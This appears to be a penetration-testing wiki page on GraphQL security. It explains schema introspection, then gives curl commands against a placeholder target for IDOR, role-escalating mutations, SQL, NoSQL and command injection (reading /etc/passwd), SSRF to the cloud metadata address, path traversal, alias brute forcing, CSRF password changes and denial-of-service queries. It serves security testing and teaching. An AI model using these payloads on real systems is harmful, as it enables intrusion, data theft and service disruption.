---
authors: ShutdownRepo, felixbillieres
category: web
---

# GraphQL

GraphQL provides a query language and runtime for APIs, allowing clients to request exactly the data they need through a single endpoint. Unlike REST APIs, GraphQL enables flexible data fetching through schemas, queries, mutations, and resolvers.

During web assessments, GraphQL implementations frequently expose schema information through introspection, authorization flaws (BOLA/IDOR), input handling issues, and DoS vectors.

## Theory

### How GraphQL works

GraphQL operates through:
- **Schema**: Defines available types, queries, and mutations
- **Queries**: Read operations to fetch data
- **Mutations**: Write operations to modify data
- **Resolvers**: Functions that populate data for each field
- **Introspection**: Built-in capability to query the schema itself

### Common security issues

- **Information disclosure**: Introspection enabled in production
- **Authorization bypass**: BOLA/IDOR on object access, over-privileged queries
- **Injection attacks**: Unsanitized resolver inputs (SQL, NoSQL, command injection)
- **DoS vectors**: Complex nested queries, unbounded operations
- **CSRF**: State-changing operations via GET requests or alternative content-types
- **Rate limiting bypass**: Using aliases to send multiple operations in one request

## Practice

### Finding GraphQL endpoints

GraphQL endpoints are commonly found at predictable paths. Test these locations:

- `/graphql`, `/api/graphql`, `/v1/graphql`, `/query`
- `/api`, `/graphql/api`

#### Universal queries

Send `{"query":"query{__typename}"}` to any suspected endpoint. GraphQL services will respond with `{"data": {"__typename": "Query"}}`.

#### Request methods

Test different HTTP methods and content-types:

::: tabs

=== Burp

**POST with JSON (recommended):**
```
POST /graphql HTTP/1.1
Host: $TARGET
Content-Type: application/json

{"query":"query{__typename}"}
```

**GET with query parameter:**
```
GET /graphql?query=query{__typename} HTTP/1.1
Host: $TARGET
```

**POST with form data:**
```
POST /graphql HTTP/1.1
Host: $TARGET
Content-Type: application/x-www-form-urlencoded

query=query{__typename}
```

=== CLI

```bash
# POST with JSON
curl -sS "http://$TARGET/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"query{__typename}"}'

# GET with query parameter
curl "http://$TARGET/graphql?query=query{__typename}"

# POST with form data
curl -sS "http://$TARGET/graphql" \
  -d "query=query{__typename}"
```

:::

> [!NOTE]
> GraphQL services often respond to invalid requests with "query not present" or similar errors.

### Schema mapping

#### Introspection

When introspection is enabled, query the schema to understand available operations:

**Basic schema query:**
```bash
curl -sS "http://$TARGET/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"query{__schema{queryType{name} mutationType{name}}}"}'
```

**Full introspection query:**
Use the standard GraphQL introspection query from [this gist](https://gist.github.com/craigbeck/b90915d49fda19d5b2b17ead14dcd6da) or generate it with GraphQL libraries.

#### When introspection is disabled

Attempt bypass techniques:

**Insert special characters:**
```bash
# Newline after __schema
curl -sS "http://$TARGET/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"query{__schema\n{queryType{name}}}"}'

# Space after __schema
curl -sS "http://$TARGET/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"query{__schema {queryType{name}}}"}'
```

**Test alternative methods:**
```bash
# GET request
curl "http://$TARGET/graphql?query=query{__schema{queryType{name}}}"

# POST with form data
curl -sS "http://$TARGET/graphql" \
  -d "query=query{__schema{queryType{name}}}"
```

**Error-based discovery:**
```bash
curl -sS "http://$TARGET/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{invalidField}"}'
```

#### Automated tools

::: tabs

=== InQL (Burp)

Install from Burp's BApp Store and run introspection on GraphQL requests.

=== GraphQLmap

```bash
python3 graphqlmap.py -u "http://$TARGET/graphql" -i
```

=== GraphQL Cop

```bash
python3 graphql-cop.py -t "http://$TARGET/graphql"
```

:::

### High-signal testing

#### BOLA/IDOR on object access

Test direct object access by manipulating IDs:

```bash
# Basic IDOR test
curl -sS "http://$TARGET/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"query{user(id:\"123\"){id name email}}"}'

# Test with different user ID
curl -sS "http://$TARGET/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"query{user(id:\"456\"){id name email role}}"}'

# Test admin access
curl -sS "http://$TARGET/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"query{user(id:\"1\"){id name email isAdmin}}"}'
```

#### Over-fetching and hidden fields

Request fields not shown in the UI:

```bash
# Test for sensitive user fields
curl -sS "http://$TARGET/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"query{user(id:\"123\"){id name email role isAdmin internalNotes permissions}}"}'

# Test admin-only data access
curl -sS "http://$TARGET/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"query{users{edges{node{id name email role lastLogin apiKey}}}}"}'
```

#### Mutations and authorization

Test privilege escalation through mutations:

```bash
# Attempt to update another user's role
curl -sS "http://$TARGET/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation{updateUser(input:{id:\"456\", role:\"ADMIN\"}){user{id role}}}"}'

# Test ownership transfer
curl -sS "http://$TARGET/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation{transferOwnership(resourceId:\"789\", newOwnerId:\"123\"){success}}"}'
```

#### Unsanitized arguments

Test for injection vulnerabilities:

**SQL/NoSQL injection:**
```bash
# Basic SQL injection in filter
curl -sS "http://$TARGET/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"query{users(filter:\"name\\' OR 1=1 --\"){id name}}"}'

# NoSQL injection
curl -sS "http://$TARGET/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"query{users(filter:\"{\\\"username\\\": {\\\"$ne\\\": null}}\" ){id name}}"}'
```

**Command injection:**
```bash
# Command injection in system operations
curl -sS "http://$TARGET/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation{execute(cmd:\"ls; cat /etc/passwd\"){output}}"}'
```

**SSRF:**
```bash
# SSRF via URL parameters
curl -sS "http://$TARGET/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation{webhook(url:\"http://169.254.169.254/latest/meta-data/\"){success}}"}'

# Internal network access
curl -sS "http://$TARGET/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation{webhook(url:\"http://internal.admin:8080/reset\"){success}}"}'
```

**Path traversal:**
```bash
# Path traversal in file operations
curl -sS "http://$TARGET/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation{uploadFile(path:\"../../../etc/passwd\"){success}}"}'
```

#### Bypassing rate limiting with aliases

Use aliases to send multiple operations in one request:

```bash
# Brute force discount codes
curl -sS "http://$TARGET/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"query{check1:checkDiscount(code:\"CODE1\"){valid} check2:checkDiscount(code:\"CODE2\"){valid} check3:checkDiscount(code:\"CODE3\"){valid}}"}'
```

#### GraphQL CSRF

Test for CSRF when endpoint accepts alternative content-types:

```bash
# Test GET-based CSRF
curl "http://$TARGET/graphql?query=mutation{changePassword(newPassword:\"hacked\"){success}}"

# Test form-based CSRF
curl -sS "http://$TARGET/graphql" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "query=mutation{changePassword(newPassword:\"hacked\"){success}}"
```

#### DoS primitives

Exploit unbounded operations:

**Deep recursion:**
```bash
# Circular fragment references
curl -sS "http://$TARGET/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"query{user(id:\"1\"){...UserFragment}} fragment UserFragment on User{friends{...UserFragment}}"}'
```

**Large result sets:**
```bash
# Unbounded pagination
curl -sS "http://$TARGET/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"query{users(first:1000000){edges{node{id name email}}}}"}'
```

> [!CAUTION]
> Control payloads to avoid overwhelming backends. Consider impact on production systems.

## Resources

### Tools
- [InQL](https://github.com/doyensec/inql) - Burp extension for schema mapping and query generation
- [GraphQLmap](https://github.com/swisskyrepo/GraphQLmap) - CLI GraphQL security testing
- [GraphQL Cop](https://github.com/dolevf/GraphQL-Cop) - GraphQL security auditing
- [Graphw00f](https://github.com/dolevf/graphw00f) - GraphQL implementation fingerprinting
- [Clairvoyance](https://github.com/nikitastupin/clairvoyance) - GraphQL schema discovery tool

### Payload collections
- [PayloadsAllTheThings - GraphQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL%20Injection) - Comprehensive GraphQL payload collection

### References
- [OWASP GraphQL Security Testing](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-API_Testing/01-Testing_GraphQL)
- [PortSwigger GraphQL Academy](https://portswigger.net/web-security/graphql)
- [Hacking GraphQL Endpoints - YesWeHack](https://www.yeswehack.com/learn-bug-bounty/hacking-graphql-endpoints)
- [GraphQL Introspection](https://graphql.org/learn/introspection/)
- [Common GraphQL Security Vulnerabilities](https://blog.yeswehack.com/yeswerhackers/how-exploit-graphql-endpoint-bug-bounty/)


### Prevention
- [Securing GraphQL APIs](https://graphql.org/learn/security/)
- [GraphQL Security Best Practices](https://www.apollographql.com/docs/apollo-server/security/cors/)



